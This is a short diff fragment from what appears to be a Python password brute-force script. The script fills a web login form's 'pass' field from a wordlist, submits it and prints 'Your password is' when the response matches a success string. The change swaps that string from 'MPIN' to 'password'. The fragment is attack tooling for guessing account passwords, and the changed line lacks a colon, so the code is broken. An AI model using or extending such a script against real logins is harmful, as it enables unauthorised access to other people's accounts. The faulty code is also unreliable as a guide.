@@ -47,7 +47,7 @@ while file:
 			browser.form['pass'] = passw
 			response = browser.submit()
 			response_data = response.read()
-			if 'MPIN' in response_data 
+			if 'password' in response_data 
 				print('Your password is : ',passw)
 				break
 	except:
